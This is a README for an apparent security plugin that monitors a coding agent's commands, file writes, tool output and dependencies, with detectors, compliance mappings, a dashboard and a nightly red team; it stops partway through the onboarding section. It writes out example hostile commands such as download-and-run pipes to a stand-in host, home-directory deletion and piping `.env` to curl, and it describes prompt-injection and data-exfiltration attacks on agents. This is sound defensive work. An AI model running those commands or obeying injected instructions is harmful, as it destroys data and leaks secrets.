# TruViq Guard for Claude Code

A Claude Code plugin that watches every prompt, tool call and tool result of the coding agent, in real time, and stops:

- **dangerous commands** (`rm -rf ~`, `curl … | sh`, force-push, `terraform destroy`, disk wipes),
- **secret theft** (`.env`, SSH keys, cloud credentials or the environment sent over the network),
- **secrets written into code** (AWS, GitHub, Groq, Google, Stripe, Slack, JWT, private keys, DB URLs),
- **prompt injection** hidden in files, web pages, issues, test output and MCP tool results (direct and indirect),
- **tampering** with the guard itself, git hooks or Claude Code settings,
- **unsafe generated code** (SQL/command injection, `eval`, unsafe deserialisation, TLS off, weak crypto, XSS, insecure Terraform/Kubernetes/Docker/CI, weakened tests),
- **unwanted libraries** added or changed (look-alike / non-existent / brand-new packages, known-vulnerable versions, git/URL sources, install scripts), and production deploys.

Every finding is tagged with **OWASP LLM Top 10, OWASP Agentic, MITRE ATLAS, CWE, SOC 2 and ISO 27001** controls and shown **in the Claude Code chat as a DENY / ASK / APPROVE card**. All machines report to a **central dashboard** (Supabase), and prompt injection, jailbreaks and CRITICAL blocks are **emailed immediately** through Resend.

> Status: **Releases 0–4** of [docs/CODING_AGENT_GUARD_REQUIREMENTS_AND_ROADMAP.md](../docs/CODING_AGENT_GUARD_REQUIREMENTS_AND_ROADMAP.md) are implemented and tested, **plus R6 (nightly red team), R7 (customer onboarding) and R8 (fleet health)** (plugin 0.4.0). R5 (MCP gateway, Antigravity, CI) is not built. See [What is done](#what-is-done-releases-04-69).

---

## Contents

1. [Quick start (your Claude Code)](#1-quick-start-your-claude-code)
2. [What you will see](#2-what-you-will-see)
3. [How it works](#3-how-it-works)
4. [Detectors and compliance mapping](#4-detectors-and-compliance-mapping)
   - [R3 · Central dashboard](#r3--central-dashboard-supabase)
   - [R4 · Generated-code and dependency review](#r4--generated-code-and-dependency-review)
   - [R9 · Code quality](#r9--code-quality-is-the-generated-code-right)
   - [R6 · Nightly red team](#r6--nightly-red-team-guard-off-vs-on)
   - [R7 · Customer onboarding](#r7--customer-onboarding)
   - [R8 · Fleet health](#r8--fleet-health-and-compatibility)
5. [Configuration](#5-configuration)
6. [Email alerts](#6-email-alerts-resend)
7. [Command-line tool](#7-command-line-tool)
8. [Testing](#8-testing)
9. [Publishing to friends and teams](#9-publishing-to-friends-and-teams)
10. [Security notes and limits](#10-security-notes-and-limits)
11. [Release history and what is done](#what-is-done-releases-04-69)
12. [Troubleshooting](#12-troubleshooting)

---

## 1. Quick start (your Claude Code)

**Requirements:** Claude Code 2.x (tested on **2.1.295 and 2.1.296**, the VS Code-family extension inside Antigravity on WSL) and `python3` 3.8+ on `PATH`. No pip packages: the guard uses only Python's standard library.

### Step 1 — your API keys (once per machine)

Keys live in **`~/.truviq/guard.env`** on each machine (permissions `600`). They are never stored in the plugin, never in this repository, and never typed into the Claude chat (the guard blocks a pasted key before it reaches the model). Run these yourself in a terminal: the guard deliberately blocks the agent from changing its own settings.

```bash
truviq setup --keys                       # asks for each key, input hidden; Enter keeps the current value
truviq setup --keys --with-service-key    # the machine that runs the dashboard also gets the service-role key
truviq setup --import-env .env            # or copy them from an existing .env (see .env.example for the names)
truviq doctor                             # shows which features are on, and what is missing
```

(Before the plugin is installed, use `python3 plugins/truviq-guard/bin/truviq.py` instead of `truviq`. You can also edit `~/.truviq/guard.env` in any editor.)

| Key | What it turns on | Where to get it | Without it |
|---|---|---|---|
| `GROQ_API_KEY` | AI classifier for unclear prompt-injection text, and the end-of-turn **code logic review** (R9) | console.groq.com/keys (free tier) | Both stay off; every rule-based check still works |
| `GOOGLE_API_KEY` | Same two features through Gemini, used when Groq is unavailable | aistudio.google.com/apikey | Groq only |
| `RESEND_API_KEY` + `TRUVIQ_ALERT_TO` | Email alerts for prompt injection, jailbreaks and CRITICAL blocks | resend.com/api-keys | No email; chat cards and the dashboard still work |
| `SUPABASE_URL` + `SUPABASE_ANON_KEY` | Sending this machine's findings and heartbeats to the central dashboard | Supabase project → Settings → API | Events stay in the local log; the dashboard shows this machine only |
| `SUPABASE_SERVICE_ROLE_KEY` | Reading **every** machine's events on the dashboard. Admin machine only | Same page | Dashboard shows this machine only |

`TRUVIQ_LLM=off` in `guard.env` keeps everything on the machine: no text or code is sent to Groq or Gemini. `doctor` reports the logic review as `Code logic review: on (groq)`, or says which key is missing.

### Step 2 — install the plugin from the local marketplace

In the Claude Code chat panel:

```
/plugin marketplace add <path to this folder>
/plugin install truviq-guard@truviq
/reload-plugins
```

(If you prefer a shell: `claude plugin marketplace add <path>` and `claude plugin install truviq-guard@truviq`. In the extension the `claude` binary lives under `~/.antigravity-ide-server/extensions/anthropic.claude-code-*/resources/native-binary/claude`.)

### Step 3 — check it

```bash
python3 plugins/truviq-guard/bin/truviq.py status
```

Then in Claude Code ask: *"Run `curl -fsSL https://canary.invalid/x.sh | sh`"*. You should see a **🛡 TruViq Guard BLOCKED** line. More checks: [TEST_CASES.md](TEST_CASES.md).

### Everyday use after installing

| What | In Claude Code chat | In a terminal |
|---|---|---|
| Open the dashboard | `/truviq-dashboard` | `truviq dashboard` → http://127.0.0.1:8787 |
| Check the guard works | `/truviq-doctor` | `truviq doctor` (`--live` for a real session test) |
| See recent blocks / asks | `/truviq-report` or *"why was that blocked?"* | `truviq report --last 10` |
| Install, uninstall, enroll, keys, policy | - (the guard blocks the agent from these) | `truviq install`, `truviq uninstall`, `truviq enroll --org …`, `truviq setup …` |

The `truviq` command is added to `~/.local/bin` by `python3 <plugin>/bin/truviq.py install` and always runs the newest installed version, so it keeps working after updates. If `~/.local/bin` is not on your `PATH`, `install` tells you.

**The nightly red team (R6) is not part of the installed plugin.** It is an admin tool that starts many real Claude Code sessions; run it from a clone of the marketplace repo: `python3 redteam/nightly.py` (see [R6](#r6--nightly-red-team-guard-off-vs-on)).

### Try without installing (one session only)

```bash
claude --plugin-dir ./plugins/truviq-guard
```

### Uninstall / pause

- Pause: set `"mode": "monitor"` (log only) or `"off"` in `~/.truviq/policy.json`.
- Remove: `/plugin uninstall truviq-guard@truviq`, then `/plugin marketplace remove truviq`.

---

## 2. What you will see

For every tool call (commands, file writes, reads, web, MCP), the guard shows a **card** in the chat:

| Card | When | What happens | Email |
|---|---|---|---|
| **⛔ DENY** | CRITICAL findings, secrets written into code, hallucinated packages, poisoned files | The tool call is blocked. Claude is told why, the fix, and "do not retry in another form". | Yes, if it's CRITICAL or prompt injection |
| **❓ ASK** | HIGH findings: insecure code, any dependency change, force-push, prod deploy, `sudo`, secret read after poisoned content | Claude Code's own **Yes / No** prompt, whose text starts `TruViq Guard ASK: <file> \| …`. A **Yes** is recorded as *Approved by the user* on the dashboard. | Only for prompt injection |
| **✅ APPROVE** (with notes) | MEDIUM findings, e.g. MD5, `innerHTML`, `git reset --hard` | Allowed; the notes are added to Claude's context so it can fix them | No |
| *(no card)* | LOW/INFO, or nothing found | Logged only | No |

Prompts and session start use a one-line message instead of a card: `🛡 TruViq Guard WARNING: … G-INJ-001 …`, or the prompt is blocked if you pasted a secret (G-SEC-002). Poisoned tool output (issue text, test output, MCP results) shows a card and marks the session **suspicious**, which makes later secret reads and network calls stricter.

**Why the alert goes to `systemMessage`:** a prompt-injected model might simply not mention a warning. `systemMessage` is shown to you by Claude Code directly and never passes through the model.

Every decision (including allowed calls) is written to `~/.truviq/logs/events.jsonl` with secret values redacted. Findings are also sent to the central dashboard ([R3](#r3--central-dashboard-supabase)).

---

## 3. How it works

### 3.1 The pieces

```
truviq_guard_for_coding_agents/
├── .claude-plugin/marketplace.json     ← local marketplace "truviq"
├── plugins/truviq-guard/               ← the plugin
│   ├── .claude-plugin/plugin.json
│   ├── hooks/hooks.json                ← which Claude Code events call the guard
│   ├── .mcp.json                       ← TruViq MCP server (guard_fetch, guard_scan)
│   ├── skills/truviq-guard/SKILL.md    ← explain-a-block skill
│   ├── policy/default_policy.json      ← the rules file (feature 1.6)
│   ├── bin/
│   │   ├── guard_hook.py               ← hook entry point + fail-safe + 10 s budget
│   │   ├── mcp_server.py               ← stdio MCP server
│   │   └── truviq.py                   ← CLI: setup, status, report, scan, git hook, email, dashboard, ship
│   ├── dashboard/                      ← R3 dashboard: built static files (from dashboard-app/), served locally
│   └── truviq_guard/                   ← the engine (stdlib only)
│       ├── engine.py      event → findings → decision → card/reply/log/alert/ship
│       ├── shell.py       Bash analysis (destructive, download-exec, exfil, tamper, sudo, prod deploy)
│       ├── injection.py   hidden text + prompt-injection rules
│       ├── classifier.py  Groq → Gemini LLM judge for unclear text and prompts (fail-closed, cached)
│       ├── codecheck.py   R4: insecure code, IaC/CI, weakened tests (added lines only)
│       ├── quality.py     R9: syntax, unused imports, undefined names, missing modules, project tests (end of turn)
│       ├── deps.py        R4: dependency diff + typosquat / registry / age / OSV / source checks
│       ├── cards.py       R4: DENY / ASK / APPROVE chat cards
│       ├── sink.py        R3: redacted events → Supabase (outbox + background shipper)
│       ├── dashboard.py   R3: localhost dashboard server (Supabase or local log) + fleet / red-team endpoints
│       ├── fleet.py       R7/R8: device id, org policy sync, heartbeats, watchdog
│       ├── install.py     R7: install / uninstall / doctor (self-test)
│       ├── redteam_report.py  R6: guard-off vs guard-on result maths
│       ├── secret_scan.py secret patterns + redaction
│       ├── state.py       per-session taint memory + pending ASK decisions (file-locked JSON)
│       ├── config.py      policy layering (default → user → project, tighten-only)
│       ├── alerts.py      Resend email (background process)
│       ├── eventlog.py    JSONL decision log
│       ├── web.py         safe fetch (SSRF guard, hidden-HTML removal)
│       ├── paths.py       glob matching, symlink-aware
│       └── catalog.py     detector IDs + compliance tags
├── supabase/001_guard_events.sql       ← R3 table + insert-only row-level security
├── supabase/002_fleet_policy_redteam.sql ← R6/R7/R8 tables (heartbeats, org policy, red-team runs)
├── tests/                              ← 219 tests + corpora + real hook fixtures + release_runner.py
├── e2e/                                ← demo repo with fake canaries + real Claude Code attack runner
├── redteam/                            ← R6: nightly.py (guard off vs on), temporal_nightly.py
├── release/                            ← release_check.py, compat_check.py, export_marketplace.py
├── mdm/                                ← R7: managed-settings template + rollout guide
├── dashboard-app/                      ← dashboard source (Next.js + TypeScript); `npm run build` ships it into plugins/truviq-guard/dashboard/
├── DESIGN.md  PRODUCT.md               ← dashboard design system and product context
├── README.md  TEST_CASES.md  MANUAL_TEST_PLAN.md  .env.example
```

### 3.2 Which Claude Code events are checked

| Hook | Matcher | What the guard does |
|---|---|---|
| `SessionStart` | all | Scans `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, … for poisoning (2.7). Warns if the repo's `.truviq/policy.json` tries to loosen the guard. |
| `UserPromptSubmit` | all | Blocks prompts containing a pasted secret (G-SEC-002), so the key never reaches the model. Warns on jailbreak phrases and invisible text (2.8); unclear wording (`ignore`, `leak`, `dump`, `reveal`…) goes to the classifier with a prompt-specific question. |
| `PreToolUse` | `Bash` | Command analysis (1.2, 1.3, 1.5), taint-aware; **R4**: packages named in `pip/npm/yarn/pnpm/poetry/uv/cargo/go/gem install`, production deploys. |
| `PreToolUse` | `Write\|Edit\|MultiEdit\|NotebookEdit` | Protected paths (1.5), secrets in new content (1.4), invisible text, poisoning of instruction files, **R4**: insecure code, IaC/CI, weakened tests and dependency changes in the lines being added, and **R9**: syntax, unused imports, undefined names, project linters. |
| `PreToolUse` | `Read` | **Scans the file before Claude reads it** (2.2): poisoned files are blocked, so the payload never enters the model's context. Secret-file reads after untrusted content need approval. |
| `PreToolUse` | `WebFetch` | Redirects to the safe `guard_fetch` tool (2.6). |
| `PreToolUse` | `mcp__.*` | Secrets passed into MCP tool arguments. |
| `PostToolUse` | `Bash\|Read\|Grep\|WebFetch\|WebSearch\|Task\|mcp__.*` | Scans tool **output** for injection (2.3); marks the session suspicious (2.4). |
| `Stop` | all | **R9**: when Claude finishes a turn that changed code: imports that resolve nowhere, the project's tests and type check, unused new dependencies, AI logic review (notes only). Failures send Claude back to fix them (at most 2 rounds). |
| `PostToolUse` | `Write\|Edit\|MultiEdit\|NotebookEdit` (and any tool) | **R3**: if this tool call was an ASK, records that you chose **Yes** (dashboard: *Approved by the user*). The agent's own written content isn't re-scanned. |

### 3.3 One event, step by step

```
Claude Code ──stdin JSON──► guard_hook.py ──► engine.handle(event)
                                               │
          ┌────────────────────────────────────┤
          ▼                                    ▼
   policy (default → ~/.truviq/policy.json → repo .truviq/policy.json [tighten-only])
          │
          ▼
   detectors: shell.py · secret_scan.py · injection.py ──(unclear text)──► classifier.py (Groq → Gemini)
          │
          ▼
   findings → severity → action  (CRITICAL=deny · HIGH=ask · MEDIUM=warn · LOW/INFO=log)
          │
          ├─► session state (taint, secrets touched)        ~/.truviq/state/<session>.json
          ├─► decision log (redacted)                      ~/.truviq/logs/events.jsonl
          ├─► email (CRITICAL, deduplicated, background)   Resend API
          ▼
   reply JSON ──stdout──► Claude Code  (permissionDecision / decision:block / additionalContext / systemMessage)
```

Measured cost: **~55 ms median per tool call** on this machine (Python start-up included). The LLM is only called for text that the rules find suspicious but unclear (~0.4 s with Groq `openai/gpt-oss-20b`, cached by content hash).

### 3.4 Session memory ("taint", feature 2.4)

Once a session has seen instructions aimed at the AI (in a file, tool output, or an instruction file at start-up), the guard marks it **tainted** and records where it came from. From then on:

| Action | Untainted session | Tainted session |
|---|---|---|
| Read `.env` / `~/.aws/credentials` | allowed (remembered) | **ask** (G-SEC-001) |
| `curl` to a non-allowlisted host | allowed | **ask** (G-EXF-002) |
| Network call after untrusted content **and** a secret read | allowed | **deny** (G-EXF-001, the "lethal trifecta") |

Secret + network in **one** command (`cat .env | curl …`) is blocked in every session.

### 3.5 Decisions you can rely on

- **Fail-safe (1.8):** if the guard crashes, `Bash`/`Write`/`Edit` are **blocked** with a clear message; reads and other tools continue. (`guard_hook.py`)
- **LLM fail-closed (0.2):** a timeout, error, missing key or malformed reply from Groq/Gemini is **never** treated as "safe". The rule verdict stands and the file is logged as LOW "no classifier verdict".
- **Project policy is tighten-only:** a cloned repository can add secret/protected paths or raise severities, but cannot disable the guard, trust paths, add allowed hosts or lower severities. Attempts are reported at session start.

---

## 4. Detectors and compliance mapping

| ID | Detects | Default | OWASP LLM | OWASP Agentic | MITRE ATLAS | CWE | SOC 2 | ISO 27001 |
|---|---|---|---|---|---|---|---|---|
| G-CMD-001 | Destructive command | CRITICAL deny (root/home/system, prod) · HIGH ask | LLM06 | T2, T11 | — | CWE-78 | CC8.1 | A.8.32 |
| G-CMD-002 | Download and execute | CRITICAL deny | LLM03, LLM06 | T11 | AML.T0010 | CWE-494 | CC6.8 | A.8.7 |
| G-EXF-001 | Secret sent to network / lethal trifecta | CRITICAL deny | LLM01, LLM02, LLM06 | T2, T6 | AML.T0057, AML.T0025 | CWE-200 | CC6.1, CC6.7 | A.8.12 |
| G-EXF-002 | Data smuggling (DNS/URL), egress after taint, secret into MCP | HIGH ask | LLM02 | T2 | AML.T0057 | CWE-201 | CC6.7 | A.8.12 |
| G-SEC-001 | Secret read after untrusted content | HIGH ask | LLM01, LLM02 | T6 | AML.T0051.001 | CWE-200 | CC6.1 | A.8.12 |
| G-SEC-002 | API key / secret pasted into your prompt | HIGH **block the prompt** (key never sent to the model) | LLM02 | — | AML.T0057 | CWE-200, CWE-312 | CC6.1, CC6.7 | A.8.12 |
| G-PRIV-001 | Guard / git-hook / settings tampering, `--no-verify` | CRITICAL deny | LLM06 | T3, T8 | — | CWE-269 | CC6.1, CC7.2 | A.8.2 |
| G-PRIV-002 | `sudo` | HIGH ask | LLM06 | T3 | — | CWE-250 | CC6.1 | A.8.2 |
| G-CODE-001 | Secret written into a file (not `.env`) | HIGH **deny** | LLM02, LLM05 | — | — | CWE-798 | CC6.1 | A.8.28 |
| G-OBF-001 | Invisible text: Unicode tags (CRITICAL), bidi (HIGH), zero-width runs (MEDIUM) | by severity | LLM01 | T6 | AML.T0051.001 | CWE-1427 | CC7.1 | A.8.28 |
| G-INJ-001 | Jailbreak text in your prompt | MEDIUM warn | LLM01 | T6, T15 | AML.T0051.000, AML.T0054 | CWE-1427 | CC7.2 | A.8.16 |
| G-INJ-002 | Instructions aimed at the AI in a file (hidden HTML comment = CRITICAL) | CRITICAL deny · HIGH ask | LLM01 | T6 | AML.T0051.001 | CWE-1427 | CC7.2 | A.8.28 |
| G-INJ-003 | Poisoned `CLAUDE.md` / `AGENTS.md` / rules files | HIGH | LLM01, LLM04 | T1, T6 | AML.T0051.001 | CWE-1427 | CC7.1 | A.8.28 |
| G-INJ-005 | Instructions aimed at the AI in tool output | HIGH block-with-reason + taint | LLM01 | T2, T6 | AML.T0051.001 | CWE-1427 | CC7.2 | A.8.16 |
| G-WEB-001 | WebFetch redirected to `guard_fetch` | LOW deny (silent) | LLM01 | T6 | AML.T0051.001 | CWE-1427 | — | — |
| G-CODE-002 | Injection-prone code: SQL from strings, `eval`, `shell=True`, pickle/yaml.load, TLS verification off, JWT unverified | HIGH ask | LLM05 | T11 | — | CWE-89/78/95/502/295 | CC8.1 | A.8.28 |
| G-CODE-003 | Weak practice: MD5/SHA-1, `random` for secrets, `innerHTML`, debug on, CORS `*` | MEDIUM approve-with-notes | LLM05 | — | — | CWE-327/338/79/489/942 | CC6.7 | A.8.24, A.8.28 |
| G-IAC-001 | Insecure Terraform/K8s/Docker/GitHub Actions (0.0.0.0/0, public bucket, privileged pod, `curl\|sh` in image, script injection) | HIGH ask / MEDIUM | LLM06 | T3 | — | CWE-732/284/250/78 | CC6.6, CC8.1 | A.8.9 |
| G-VER-001 | Tests/checks weakened (skip, deleted assertions, lower coverage, `# nosec`) | HIGH ask | LLM06 | T7 | — | CWE-1164 | CC8.1 | A.8.29 |
| G-DEP-001 | Suspicious dependency: not on registry (CRITICAL deny), look-alike name, < 30 days old, known CVE | CRITICAL / HIGH | LLM03, LLM09 | T5 | AML.T0010 | CWE-1357, CWE-1104 | CC9.2 | A.5.21 |
| G-DEP-002 | Production deploy (kubectl/helm/terraform/vercel/… against prod) | HIGH ask | LLM06 | T10 | — | — | CC8.1 | A.8.32 |
| G-DEP-003 | Any dependency added/changed/removed (manifest edit or install command) | MEDIUM, action **ask** | LLM03 | — | — | CWE-1357 | CC9.2, CC8.1 | A.5.21, A.8.32 |
| G-DEP-004 | Dependency from git/URL/file, or a new npm install script | HIGH ask | LLM03 | T11 | AML.T0010 | CWE-494, CWE-829 | CC9.2 | A.5.21 |

Each log record also carries `vulnerability` with the DeepTeam name (`PIILeakage`, `IndirectInstruction`, `ExcessiveAgency`, `SupplyChain`, …) so the main TruViq platform's mappers can consume guard events. **Have the compliance team review these IDs before customer use.**

---

## R3 · Central dashboard (Supabase)

Every machine with the plugin sends each finding (redacted) to one Supabase table. One dashboard shows all machines live.

```
 laptop A ─┐  hook → ~/.truviq/outbox → `truviq.py ship` (background, anon key, INSERT only)
 laptop B ─┼──────────────────────────────────────────────►  Supabase  public.guard_events
 laptop C ─┘                                                     │
                                  `truviq.py dashboard` (service-role key, server side only)
                                                                 ▼
                                               http://127.0.0.1:8787  (your browser)
```

**One-time setup**

1. In Supabase: **SQL Editor → New query**, paste [`supabase/001_guard_events.sql`](supabase/001_guard_events.sql), **Run**. It creates the table, indexes, and row-level security that lets the anon key **insert only** (no reads).
2. On every machine: `truviq.py setup --import-env .env` (adds `SUPABASE_URL` + `SUPABASE_ANON_KEY`).
3. On the dashboard machine only: `truviq.py setup --import-env .env --with-service-key`.
4. Start it: `python3 plugins/truviq-guard/bin/truviq.py dashboard` → open <http://127.0.0.1:8787>.

**What the dashboard shows** (one screen, ordered by what needs action)

- **Triage strip:** three lanes, **Asked a person** (ASK), **Blocked** (DENY) and **Allowed with notes** (APPROVE). Each shows its count, its most urgent items and a summary line (for ASK: how many are *waiting*, *approved* and *not approved*). Clicking a lane filters the table to exactly those actions.
- **Guarded actions table** (refreshes every 5 s): in triage order by default (waiting asks, decided asks, blocked, allowed; then severity, then time), with divider rows between the groups. The **Severity** and **When** headers re-sort it. Columns: verdict tag, severity (shape + word), what happened, machine and user, where (file:line, or the project plus "Shell command", "Prompt", "File write", ...), when.
- **Row details:** every finding with its redacted evidence, dependency chips (`+ added`, `~ changed`, `- removed`, `! install script`), the ASK outcome (**Approved by a person**, **Not approved** or **Waiting for a decision**), machine, user, project, hook, mode, the compliance controls (OWASP, MITRE ATLAS, CWE, SOC 2, ISO 27001), and the exact card shown in Claude Code.
- **New since you looked:** actions you haven't opened carry a **NEW** mark until you open them or press **Mark N as seen** (remembered in this browser only).
- **Filters:** time range (1h / 24h / 7d / all), machine, category (prompt injection, generated code, dependencies, commands & data), free-text search.
- **Fleet health** (R8), **Nightly red team** (R6) and **Most frequent detectors** in the right column. On narrow screens and projectors (below 1180 px) fleet health and the red team move above the table.
- Without the service-role key it shows **this machine only** (from `~/.truviq/logs/events.jsonl`); `--local` forces that.

The page is a Next.js app exported to plain static files and shipped inside the plugin, so **users need only Python**. It uses no CDN or web fonts (Arial and Calibri) and works offline.

**Changing the dashboard** (developers only, needs Node.js 20+):

```bash
cd dashboard-app
npm install
truviq dashboard --port 8787 &     # the API the page reads
npm run dev                        # http://localhost:3000, /api/* is forwarded to :8787
npm run build                      # type-checks, exports, and copies the result into plugins/truviq-guard/dashboard/
```

Commit the rebuilt `plugins/truviq-guard/dashboard/` together with the source change and bump the plugin version, otherwise installed plugins keep the old page. Design rules (colours, type, layout, and when red/amber/green may be used) are in [DESIGN.md](DESIGN.md).

**Safety of the dashboard:** binds to `127.0.0.1` only, rejects non-localhost `Host` headers (DNS rebinding), read-only, strict Content-Security-Policy, and renders all event text as plain text. The service-role key never reaches the browser. Shipping never blocks Claude Code; offline machines keep events in the outbox and send them later (`truviq.py ship` to force).

## R4 · Generated-code and dependency review

Before Claude Code writes a file, the guard computes **what the change adds** (the file on disk vs. the new content) and checks only those lines, so old code is not flagged again on every edit.

| Check | Example | Card |
|---|---|---|
| Injection-prone code | `cur.execute(f"SELECT … {uid}")`, `subprocess.run(cmd, shell=True)`, `yaml.load(f)`, `verify=False` | **ASK** |
| Weak practice | `hashlib.md5`, `Math.random()` for a token, `innerHTML =` | **APPROVE** with notes |
| Insecure infra / CI | `cidr_blocks = ["0.0.0.0/0"]`, `privileged: true`, `${{ github.event.issue.title }}` in `run:` | **ASK** |
| Weakened tests | `@pytest.mark.skip`, deleting assertions, `fail_under` 90 → 50 | **ASK** |
| Dependency changed | any add/change/remove in `requirements*.txt`, `pyproject.toml`, `Pipfile`, `package.json`, `go.mod`, `Cargo.toml`, `Gemfile`, or `pip/npm/yarn/pnpm/poetry/uv/cargo/go/gem install …` | **ASK**, with the list of libraries |
| Look-alike / new / vulnerable package | `reqeusts` (≈ requests), first published 3 days ago, OSV advisory for the pinned version | **ASK** |
| Package that does not exist | hallucinated name, 404 on PyPI/npm | **DENY** |
| Git/URL source, new install script | `"helper": "git+https://…"`, new `postinstall` | **ASK** |
| Production deploy | `kubectl apply … --context prod` | **ASK** |
| Secret in code | AWS/GitHub/Google/… key in a `.py` | **DENY** |

The card in the chat (from a real run):

```
┌─ ❓ TruViq Guard · ASK ──────────────────────────────────────────────────
│ Edit · requirements.txt
│ HIGH     G-DEP-001  Suspicious dependency
│          reqeusts looks like a misspelling of the popular package
│          requests (typosquat risk)
│          ▸ reqeusts ==2.31.0
│ MEDIUM   G-DEP-003  Dependency added or changed
│          2 dependency change(s) in requirements.txt: + reqeusts ==2.31.0,
│          ~ flask ==3.0.0 → ==3.0.3
│ Dependencies changed:
│   + reqeusts ==2.31.0
│   ~ flask ==3.0.0 → ==3.0.3
│ OWASP LLM03 · OWASP LLM09 · CWE-1357 · CWE-1104
│ Your call: choose Yes to accept this change, No to reject it. Your answer is recorded on the dashboard.
└───────────────────────────────────────────────────────────────────────────
```

- **DENY** blocks the tool call; Claude is told why and not to retry another way.
- **ASK** uses Claude Code's own **Yes / No** approval prompt (the prompt text starts with `TruViq Guard ASK: <file> | …`). If you choose Yes, the guard sees the tool run and records **Approved by the user** on the dashboard.
- **APPROVE** lets it through and adds the notes to Claude's context so it can fix them.
- Claude Code's chat cannot render custom buttons, so the card is text and the buttons are Claude Code's native approval prompt.
- Registry and OSV lookups use a 2 s timeout and a 24 h cache; if a lookup fails the card says "could not verify" (LOW), it is never treated as safe. Set `"dependencies": {"registry_check": false}` to stay fully offline, or `"detectors": {"G-DEP-003": {"action": "warn"}}` to stop asking on every dependency change.

---

## R9 · Code quality (is the generated code right?)

R4 asks "is this code **safe**?". R9 asks "is this code **correct, and does it run**?". It checks what Claude Code writes **while it writes**, and checks the whole change again **before Claude hands it back to you**.

**Before each write** (PreToolUse, under 100 ms, no installs needed):

| Check | Languages | Verdict |
|---|---|---|
| **Syntax**: the file would not parse | Python, JSON, TOML (YAML when PyYAML is installed). `tsconfig.json`-style files with comments are skipped. | **DENY** (G-QUAL-002). Claude is told the line and error and rewrites the file. An edit to a file that was *already* broken is not blocked. |
| **Unused imports** the change adds | Python, JS/TS | **APPROVE** with a note (G-QUAL-001), e.g. `np (numpy) (line 1)` |
| **Names used but never defined**, which would fail with NameError | Python | **ASK** (G-QUAL-003) |
| **The project's own linter** on the added lines | ruff (if the project configures it), eslint (if the project has it in `node_modules`) | **APPROVE** with a note (G-QUAL-007) |

**At the end of Claude's turn** (the `Stop` hook), when every file of the change exists:

| Check | Verdict |
|---|---|
| **Imports that resolve nowhere** (not stdlib, not in the project, not installed, not in requirements / package.json): misspelled or invented packages | Claude is **sent back to fix it** (G-QUAL-003) |
| **The project's tests** (pytest / `python -m unittest` / `npm test` / `go test`, or your own `test_command`) and the **TypeScript type check** (`tsc --noEmit`), with a time limit | Failing: Claude is **sent back to fix it** with the failure output (G-QUAL-004). Too slow: a note. |
| **Dependencies added this turn that nothing uses** | Note (G-QUAL-006) |
| **Logic review** by the Groq/Gemini model: the user's request + the diff, e.g. "divide may raise ZeroDivisionError when b is zero". **On by default** when a Groq or Gemini key is configured; the diff is sent with secrets redacted | Note only, never blocks (G-QUAL-005) |

"Sent back to fix it" uses Claude Code's Stop-hook `block`: Claude keeps working with the guard's reason instead of finishing. After **2 rounds** (`max_fix_rounds`) the guard stops insisting and hands the code back to you with a summary. Notes appear in the chat as a "TruViq Guard code notes" message. Everything is logged and shown on the dashboard under **Generated code** (where: *End of turn*). Nothing in R9 sends email.

Why module checks wait for the end of the turn: Claude writes files one at a time, so `main.py` often imports `calculator` before `calculator.py` exists. Checking at the end avoids false alarms on nearly every multi-file task.

Example from a real Claude Code run: the repository had a test expecting `divide(1, 0) == inf`. Claude wrote a `divide` without the zero case; at the end of its turn the guard ran the tests (G-QUAL-004, sent back, round 1 of 2), Claude changed `divide`, the second check passed, and the turn ended with passing tests.

**Settings** (`~/.truviq/policy.json` or the organisation policy; a repository's `.truviq/policy.json` cannot change them):

```json
{
  "quality": {
    "enabled": true,
    "run_tests": true,
    "test_command": "",
    "test_timeout_seconds": 90,
    "max_fix_rounds": 2,
    "linters": true,
    "logic_review": true
  }
}
```

**AI logic review is on by default.** It runs at the end of each turn that changed code, when a Groq or Gemini key is in `~/.truviq/guard.env` (`truviq doctor` shows "Code logic review: on (groq, gemini)" or what is missing). It sends the user's request and the diff of the changed files, with secrets redacted, to that provider, and only ever adds notes. To keep code on the machine, set `"logic_review": false` (or `TRUVIQ_LLM=off` in `guard.env` to switch off every LLM call).

Each check also has its own switch: `syntax`, `unused_imports`, `undefined_names`, `missing_modules`, `type_check`, `unused_dependencies`. Keep `test_timeout_seconds` at 150 or below; the end-of-turn check has a 200 s budget in total.

**Running project tools:** the tests, `tsc`, `ruff` and `eslint` are the project's own, run the same way a developer runs them, with `CI=1` and the guard's own variables removed. They are **not run in a session that has read untrusted content** (taint), so a poisoned file cannot use the guard to start them. Set `"run_tests": false` and `"linters": false` if you don't want the guard to run project code at all.

---

## R6 · Nightly red team (guard off vs on)

Proves the guard works, with numbers, against **real Claude Code**. It reuses the fixed, harmless cases of `e2e/run_e2e.py` (demo repo with fake canary secrets and `.invalid` URLs) and runs each one twice:

| Arm | What the guard does | What it tells you |
|---|---|---|
| **monitor** ("guard off") | only logs what it would have done | which attacks the agent actually *attempts*, and whether a canary file appears when nothing stops it |
| **enforce** ("guard on") | blocks / asks | how many attempts were blocked, and whether anything **leaked** (a canary file exists) |

```bash
python3 redteam/nightly.py --model haiku                      # all 8 cases x 2 arms (16 short sessions, uses your Claude Code plan)
python3 redteam/nightly.py --case curl_pipe_sh --no-ship      # one case, local only
```

Example from a real run: *guard OFF reached 2/2 attacks, guard ON blocked 1/1 attempted, leaked 0, verdict PASS* (the secret-in-code canary file appeared with the guard off). Results go to `~/.truviq/redteam/runs.jsonl` and, if configured, the `redteam_runs` table; the dashboard shows the latest runs in **Red team (nightly)**.

- **Verdict:** `FAIL` if any canary leaked with the guard on, `PASS` if attacks were attempted and none leaked, `INCONCLUSIVE` if the model declined every attack (the guard was never asked).
- **Schedule it:** `0 2 * * * cd /path/truviq_guard_for_coding_agents && python3 redteam/nightly.py` (cron), or on Temporal: `pip install temporalio`, then `python3 redteam/temporal_nightly.py worker` and `... schedule --hour 2`. It uses its own task queue (`truviq-guard-redteam`) and schedule id, so it never touches the AI Sentinel workflows. *The Temporal wrapper is written against the SDK's documented API but could not be run in the build environment (no `temporalio`, no server access); try `run-now` first.*
- **No new attack content:** the runner only replays the existing fixtures. Promptfoo's `coding-agent:*` plugins are not wired in yet.

## R7 · Customer onboarding

One command per step, all in `truviq.py`:

```bash
python3 plugins/truviq-guard/bin/truviq.py setup --import-env .env       # keys -> ~/.truviq/guard.env
python3 plugins/truviq-guard/bin/truviq.py enroll --org acme             # register this machine, pull org policy, first heartbeat
python3 plugins/truviq-guard/bin/truviq.py install [--source owner/repo] [--git REPO]   # marketplace add + plugin install (+ git hook)
